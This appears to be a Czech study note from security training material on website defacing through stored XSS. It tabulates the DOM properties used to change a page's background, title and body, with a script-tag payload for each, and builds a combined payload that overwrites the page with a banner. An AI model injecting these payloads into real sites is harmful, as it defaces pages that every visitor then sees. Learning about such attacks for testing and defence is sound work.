## 📌 Co je to Defacing?

**Defacing** (změna vizuální podoby webu) je častý typ útoku spojovaný se zranitelností **Stored XSS**. Útočníci jej využívají k veřejnému předvedení úspěšného průniku do systému nebo k zanechání vzkazu. Jelikož se u Stored XSS vkládaný kód ukládá do databáze, změna vzhledu je trvalá a zobrazí se všem návštěvníkům stránky.

## 🛠️ Klíčové vlastnosti DOM manipulace při Defacingu

K úpravě vzhledu stránky na klientské straně se v JavaScriptu manipuluje s následujícími vlastnostmi objektu `document`:

|**Cílový prvek**|**JavaScriptová vlastnost**|**Příklad použití v XSS**|
|---|---|---|
|**Barva pozadí**|`document.body.style.background`|`<script>document.body.style.background = "#141d2b"</script>`|
|**Obrázek na pozadí**|`document.body.background`|`<script>document.body.background = "https://.../logo.svg"</script>`|
|**Titulok karty (Title)**|`document.title`|`<script>document.title = 'HackTheBox Academy'</script>`|
|**Obsah celého těla (HTML)**|`document.getElementsByTagName('body')[0].innerHTML`|`<script>document.getElementsByTagName('body')[0].innerHTML = '<h1>Hacked</h1>'</script>`|

## ⚙️ Postup sestavení komplexního payloadu

1. **Změna pozadí a titulku:** Nastavení tmavého pozadí a nového názvu záložky v prohlížeči.
    
2. **Náhrada obsahu tělápomocí `innerHTML`:** Přepsání obsahu prvku `<body>` vlastní HTML strukturou (např. vzkazem nebo vlastním bannerem).
    
3. **Výsledný spojitý payload:**
    
    HTML
    
    ```
    <script>
      document.body.style.background = "#141d2b";
      document.title = "Defaced Page";
      document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1></center>';
    </script>
    ```
    

> 💡 **Princip:** Přestože původní HTML kód aplikace ve zdrojovém kódu na serveru stále existuje, vložený JavaScript po spuštění v prohlížeči kompletně překryje zobrazený obsah novým HTML prvkem.